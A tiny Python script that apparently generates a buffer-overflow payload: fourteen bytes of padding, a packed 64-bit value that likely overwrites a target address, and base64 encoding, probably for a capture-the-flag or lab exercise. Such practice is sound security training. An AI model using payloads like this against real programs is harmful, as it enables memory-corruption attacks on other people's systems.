
import sys
import struct
import base64

buf = b'ZZZZZZZZZZZZZZ'
buf += struct.pack('<Q', 12009266769651411037)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
